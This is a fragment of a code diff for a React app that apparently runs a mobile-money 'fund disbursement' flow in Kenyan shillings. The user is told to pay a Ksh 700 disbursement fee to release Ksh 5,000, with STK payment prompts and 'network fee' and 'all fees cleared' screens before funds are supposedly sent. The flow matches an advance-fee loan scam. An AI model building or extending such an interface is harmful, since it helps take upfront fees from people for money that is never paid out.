-          <p className="sub">Final step before your funds are released.</p>
-          <div className="summary-card">
-            <div className="summary-title">Disbursement Summary</div>
-            <div className="summary-row"><span className="k">Fund Amount</span><span className="v hi">Ksh 5,000</span></div>
-            <div className="summary-row"><span className="k">Disbursement Fee</span><span className="v hi">Ksh 700</span></div>
-          </div>
-          <button className="btn" onClick={processDisbursementFeePayment}>Pay Ksh 700 — Release My Funds</button>
-        </section>
-      </div>
-
-      {/* BOTTOM SHEET (Hear About) */}
+      {/* BOTTOM SHEET */}
       {showHearAboutSheet && (
         <div className="sheet-bg show" onClick={() => setShowHearAboutSheet(false)}>
           <div className="sheet show" onClick={e => e.stopPropagation()}>
@@ -566,7 +510,7 @@ export default function App() {
         </div>
       )}
 
-      {/* STK WAITING OVERLAY */}
+      {/* STK OVERLAY */}
       {showStkOverlay && (
         <div className="stk-overlay show">
           <div className="ring"></div>
@@ -577,7 +521,7 @@ export default function App() {
         </div>
       )}
 
-      {/* NETWORK FEE CONFIRMED OVERLAY */}
+      {/* NETWORK FEE CONFIRMED */}
       {showNetFeeConfirmed && (
         <div className="modal-bg show">
           <div className="modal-card">
@@ -592,7 +536,7 @@ export default function App() {
         </div>
       )}
 
-      {/* ALL FEES CLEARED OVERLAY */}
+      {/* ALL FEES CLEARED */}
       {showAllFeesCleared && (
         <div className="modal-bg show">
           <div className="modal-card">
@@ -603,7 +547,7 @@ export default function App() {
               <div className="val">{disburseReceipt}</div>
             </div>
             <p style={{ fontSize: 12, color: 'var(--deep)', fontWeight: 600 }}>Sending funds to your phone...</p>
-            <button className="btn dark" onClick={() => { setShowAllFeesCleared(false); setView('splash'); window.location.reload(); }}>Done</button>
+            <button className="btn dark" onClick={() => { setShowAllFeesCleared(false); setView('step1'); }}>Done</button>
           </div>
         </div>
       )}
